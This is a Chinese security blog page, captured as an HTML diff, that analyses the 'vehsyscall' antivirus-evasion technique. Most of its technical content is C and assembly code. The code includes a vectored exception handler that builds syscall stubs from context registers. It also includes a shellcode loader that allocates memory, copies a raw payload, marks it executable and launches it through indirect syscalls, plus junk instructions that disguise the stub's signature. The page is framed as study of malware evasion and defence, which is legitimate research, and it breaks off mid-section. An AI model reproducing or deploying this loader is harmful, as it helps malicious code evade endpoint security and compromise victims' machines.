@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>VEH syscall 免杀分析 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="VEH syscall 免杀分析前言项目地址 1https:&#x2F;&#x2F;github.com&#x2F;coleak2021&#x2F;vehsyscall  VEH syscall免杀的VEH syscall技术主要用于绕过安全软件的检测机制。这种技术通过异常处理和系统底层调用的特殊手段，达到执行代码同时隐蔽其行为的目的。了解其作用、为什么需要这样绕过，以及对应的杀毒软件检测机制，可以帮助我们更好地理解现代恶意软件和高级持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VEH syscall 免杀分析">
+<meta property="og:url" content="http://c0ke.top/2025/07/15/VEH%20syscall%20%E5%85%8D%E6%9D%80%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Daily Study">
+<meta property="og:description" content="VEH syscall 免杀分析前言项目地址 1https:&#x2F;&#x2F;github.com&#x2F;coleak2021&#x2F;vehsyscall  VEH syscall免杀的VEH syscall技术主要用于绕过安全软件的检测机制。这种技术通过异常处理和系统底层调用的特殊手段，达到执行代码同时隐蔽其行为的目的。了解其作用、为什么需要这样绕过，以及对应的杀毒软件检测机制，可以帮助我们更好地理解现代恶意软件和高级持">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png">
+<meta property="article:published_time" content="2025-07-15T08:06:26.364Z">
+<meta property="article:modified_time" content="2025-07-30T03:18:41.332Z">
+<meta property="article:author" content="C0KE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://c0ke.top/2025/07/15/VEH%20syscall%20%E5%85%8D%E6%9D%80%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'VEH syscall 免杀分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-30 11:18:41'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">VEH syscall 免杀分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-15T08:06:26.364Z" title="发表于 2025-07-15 16:06:26">2025-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-30T03:18:41.332Z" title="更新于 2025-07-30 11:18:41">2025-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RE%E7%AC%94%E8%AE%B0/">RE笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="VEH syscall 免杀分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="VEH-syscall-免杀分析"><a href="#VEH-syscall-免杀分析" class="headerlink" title="VEH syscall 免杀分析"></a>VEH syscall 免杀分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>项目地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/coleak2021/vehsyscall</span><br></pre></td></tr></table></figure>
+
+<h2 id="VEH-syscall"><a href="#VEH-syscall" class="headerlink" title="VEH syscall"></a>VEH syscall</h2><p>免杀的VEH syscall技术主要用于绕过安全软件的检测机制。这种技术通过异常处理和系统底层调用的特殊手段，达到执行代码同时隐蔽其行为的目的。了解其作用、为什么需要这样绕过，以及对应的杀毒软件检测机制，可以帮助我们更好地理解现代恶意软件和高级持续性威胁（APT）的防御和检测策略。</p>
+<h3 id="免杀的VEH-syscall的作用"><a href="#免杀的VEH-syscall的作用" class="headerlink" title="免杀的VEH syscall的作用"></a>免杀的VEH syscall的作用</h3><ol>
+<li><strong>执行隐藏的系统调用</strong>：通过直接在底层进行系统调用，可以避免使用标准的API调用方式，这些API调用是杀毒软件常用的监控点。</li>
+<li><strong>异常控制流修改</strong>：VEH允许在异常发生时修改程序的执行流程。恶意软件可以利用这一点，在异常处理代码中插入恶意行为，而这部分代码在正常执行流中可能不会被触及。</li>
+<li><strong>动态行为执行</strong>：通过VEH和syscall，恶意软件可以根据执行时的环境和上下文动态地调整其行为，这使得静态分析变得更加困难。</li>
+</ol>
+<h3 id="为什么需要绕过安全检测"><a href="#为什么需要绕过安全检测" class="headerlink" title="为什么需要绕过安全检测"></a>为什么需要绕过安全检测</h3><p>恶意软件作者需要绕过安全检测，以保证软件能够在受害者机器上成功执行，从而：</p>
+<ol>
+<li><strong>持久化</strong>：避免被杀毒软件发现并清除，确保长时间运行以持续控制受害者机器或窃取信息。</li>
+<li><strong>避免分析</strong>：使得安全研究人员难以分析和理解恶意软件的真实功能，增加分析的成本和难度。</li>
+<li><strong>扩展感染</strong>：在不被检测的情况下，更容易扩散到更多的系统和网络中。</li>
+</ol>
+<h3 id="杀毒软件的检测机制"><a href="#杀毒软件的检测机制" class="headerlink" title="杀毒软件的检测机制"></a>杀毒软件的检测机制</h3><ol>
+<li><strong>行为监控</strong>：许多杀毒软件通过监控程序行为（如文件访问、网络通信、注册表修改等）来检测潜在的恶意活动。</li>
+<li><strong>API调用分析</strong>：杀毒软件常常分析程序的API调用模式，寻找异常或与已知恶意行为模式相匹配的调用。</li>
+<li><strong>内存扫描</strong>：杀毒软件会扫描程序在内存中的行为，包括执行的代码和数据的访问模式。</li>
+<li><strong>静态分析</strong>：对程序文件进行静态分析，寻找恶意代码的签名或病毒的特征。</li>
+<li><strong>启发式分析</strong>：通过启发式规则来预测未知威胁的行为，这依赖于对恶意软件行为模式的深入了解。</li>
+</ol>
+<h2 id="VEH-syscall原理"><a href="#VEH-syscall原理" class="headerlink" title="VEH syscall原理"></a>VEH syscall原理</h2><p><strong>VEH基础</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// VEH原型</span></span><br><span class="line">LONG CALLBACK <span class="title function_">VectoredExceptionHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span>;</span><br><span class="line">LONG CALLBACK <span class="title function_">VectoredExceptionHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否存在访问冲突</span></span><br><span class="line">    <span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Access violation detected!\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 处理访问冲突的代码段</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理其他额外异常的代码段</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// EXCEPTION_CONTINUE_SEARCH返回值为0，并且调用下一个处理程序函数</span></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 注册VEH</span></span><br><span class="line">    PVOID handle = AddVectoredExceptionHandler(<span class="number">1</span>, VectoredExceptionHandler);</span><br><span class="line">    <span class="comment">// 取消注册VEH</span></span><br><span class="line">    RemoveVectoredExceptionHandler(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>VEH syscall流程</strong></p>
+<p>![image-20240229092953218](picture&#x2F;VEH syscall 免杀分析&#x2F;bd5656a2-81a8-4307-a12a-8dd813dc7a31.png)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vectored Exception Handler function</span></span><br><span class="line">LONG CALLBACK <span class="title function_">PvectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS exception_ptr)</span> &#123;</span><br><span class="line">    <span class="comment">// Check if the exception is an access violation</span></span><br><span class="line">    <span class="keyword">if</span> (exception_ptr-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) &#123;</span><br><span class="line">        <span class="comment">// Modify the thread&#x27;s context to redirect execution to the syscall address</span></span><br><span class="line">        <span class="comment">// Copy RCX register to R10</span></span><br><span class="line">        exception_ptr-&gt;ContextRecord-&gt;R10 = exception_ptr-&gt;ContextRecord-&gt;Rcx;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Copy RIP (Instruction Pointer) to RAX (RIP keeps SSN --&gt; RAX keeps SSN)      </span></span><br><span class="line">        exception_ptr-&gt;ContextRecord-&gt;Rax = exception_ptr-&gt;ContextRecord-&gt;Rip;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set RIP to global address (set syscalls address retrieved from NtDrawText to RIP register)       </span></span><br><span class="line">        exception_ptr-&gt;ContextRecord-&gt;Rip = g_syscall_addr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Continue execution at the new instruction pointer</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Continue searching for another exception handler</span></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里通过ContextRecord修改程序上下文中的寄存器值构造了syscall stub</p>
+</blockquote>
+<p><strong>vehsyscall关键代码分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// define var</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="type">int</span>, <span class="built_in">string</span>&gt; Nt_Table;</span><br><span class="line">DWORD t = <span class="number">0</span>;</span><br><span class="line">LPVOID m_Index = m_Index = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Ntdll.dll&quot;</span>), <span class="string">&quot;NtDrawText&quot;</span>);<span class="comment">//a safe function address that may not be hooked by edr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//main function</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="comment">//exec NtAllocateVirtualMemory</span></span><br><span class="line">    NtAllocateVirtualMemory pNtAllocateVirtualMemory = <span class="literal">NULL</span>;</span><br><span class="line">    t = GetSSN(<span class="string">&quot;ZwAllocateVirtualMemory&quot;</span>);</span><br><span class="line">    pNtAllocateVirtualMemory((HANDLE)<span class="number">-1</span>, &amp;lpAddress, <span class="number">0</span>, &amp;sDataSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write your code</span></span><br><span class="line">    VxMoveMemory(lpAddress, rawData, <span class="keyword">sizeof</span>(rawData));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//exec NtProtectVirtualMemory</span></span><br><span class="line">    NtProtectVirtualMemory pNtProtectVirtualMemory = <span class="literal">NULL</span>;</span><br><span class="line">    t = GetSSN(<span class="string">&quot;ZwProtectVirtualMemory&quot;</span>);</span><br><span class="line">    pNtProtectVirtualMemory((HANDLE)<span class="number">-1</span>, &amp;lpAddress, &amp;sDataSize, PAGE_EXECUTE_READ, &amp;ulOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//exec NtCreateThreadEx</span></span><br><span class="line">    pNtCreateThreadEx NtCreateThreadEx = <span class="literal">NULL</span>;</span><br><span class="line">    t = GetSSN(<span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetSSN</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> apiname)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="type">int</span>, <span class="built_in">string</span>&gt;::iterator iter = Nt_Table.begin(); iter != Nt_Table.end(); ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (apiname == iter-&gt;second)</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VEH function</span></span><br><span class="line">LONG WINAPI <span class="title function_">VectExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// handle EXCEPTION_ACCESS_VIOLATION</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) &#123;</span><br><span class="line">        <span class="comment">// Construct syscall stub</span></span><br><span class="line"></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;R10 = pExceptionInfo-&gt;ContextRecord-&gt;Rcx; <span class="comment">// mov r10,rcx</span></span><br><span class="line">        hello(); </span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Rax = t;   <span class="comment">//mov rax,xxx</span></span><br><span class="line">        hello();</span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Rip = (DWORD64)((DWORD64)m_Index + <span class="number">0x12</span>); <span class="comment">// syscall</span></span><br><span class="line">        hello();</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION; <span class="comment">// cintinue your code</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH; <span class="comment">//find othner function to handle VEH  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过遍历‘Zw’的map获取SSN，利用EXCEPTION_ACCESS_VIOLATION异常处理进行syscall stub构造</p>
+</blockquote>
+<p><strong>coleak.asm</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">	name db &#x27;coleak&#x27;,0</span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">	hello PROC</span><br><span class="line">		nop</span><br><span class="line">		mov eax,ebx</span><br><span class="line">		mov ebx,edx</span><br><span class="line">		mov ebx,eax</span><br><span class="line">		nop</span><br><span class="line">		mov edx,ebx</span><br><span class="line">		ret</span><br><span class="line">	hello ENDP</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简单打乱下syscall stub的特征</p>
+</blockquote>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><strong>_LDR_DATA_TABLE_ENTRY</strong></p>
+<p>根据InMemoryOrderModuleList的Flink值查找对应结构时，一定要减去16字节（0x10），以保证我们正确对齐（x86或x64皆如此）</p>
+<p><strong>段寄存器</strong></p>
+<p>x64 GS</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gs:[<span class="number">0x30</span>]                 TEB</span><br><span class="line">gs:[<span class="number">0x40</span>]                 Pid</span><br><span class="line">gs:[<span class="number">0x48</span>]                 Tid</span><br><span class="line">gs:[<span class="number">0x60</span>]                 PEB</span><br><span class="line">gs:[<span class="number">0x68</span>]                 LastError</span><br></pre></td></tr></table></figure>
+
+<p>x86 FS</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一、MOV EAX, FS: [<span class="number">0x18</span>] </span><br><span class="line">MOV EAX, [EAX + <span class="number">0x30</span>]</span><br><span class="line">二、MOV EAX, FS: [<span class="number">0x30</span>]</span><br><span class="line"><span class="comment">//peb</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>PEB地址</strong></p>
+<ul>
+<li>​    在x86进程的线程进程块(<strong>TEB</strong>)中FS寄存器中的0x30偏移处找到。 </li>
+<li>​    在x64进程的线程进程块(<strong>TEB</strong>)中GS寄存器中的0x60偏移处找到。</li>
+</ul>
+<p><em><strong>OSMajorVersion</strong></em><br>一个表示操作系统的主版本号的数字。 下表定义了 Windows 操作系统的主版本。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows 版本	主版本</span><br><span class="line">Windows <span class="number">11</span> (所有版本)	<span class="number">10</span></span><br><span class="line">Windows Server <span class="number">2022</span>	<span class="number">10</span></span><br><span class="line">Windows Server <span class="number">2019</span>	<span class="number">10</span></span><br><span class="line">Windows Server <span class="number">2016</span>	<span class="number">10</span></span><br><span class="line">Windows <span class="number">10</span> (所有版本)	<span class="number">10</span></span><br><span class="line">Windows Server <span class="number">2012</span> R2	<span class="number">6</span></span><br><span class="line">Windows <span class="number">8.1</span>	<span class="number">6</span></span><br><span class="line">Windows Server <span class="number">2012</span>	<span class="number">6</span></span><br><span class="line">Windows <span class="number">8</span>	<span class="number">6</span></span><br><span class="line">Windows Server <span class="number">2008</span> R2	<span class="number">6</span></span><br><span class="line">Windows <span class="number">7</span>	<span class="number">6</span></span><br><span class="line">Windows Server <span class="number">2008</span>	<span class="number">6</span></span><br><span class="line">Windows Vista	<span class="number">6</span></span><br><span class="line">Windows Server <span class="number">2003</span> R2	<span class="number">5</span></span><br><span class="line">Windows Server <span class="number">2003</span>	<span class="number">5</span></span><br><span class="line">Windows XP	<span class="number">5</span></span><br><span class="line">Windows <span class="number">2000</span>	<span class="number">5</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>内存小端存储</strong></p>
